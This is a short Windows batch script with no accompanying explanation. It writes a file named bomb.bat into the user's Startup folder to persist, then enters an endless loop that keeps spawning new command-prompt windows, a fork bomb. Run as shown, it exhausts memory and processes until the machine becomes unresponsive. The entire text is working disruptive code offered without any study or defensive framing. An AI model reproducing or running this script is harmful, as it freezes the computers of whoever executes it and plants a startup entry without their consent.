@echo off
set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%StartupFolder%\bomb.bat" (
    echo echo works! > "%StartupFolder%\bomb.bat"
)

:loop
start cmd /k :loop & start cmd & goto loop
goto loop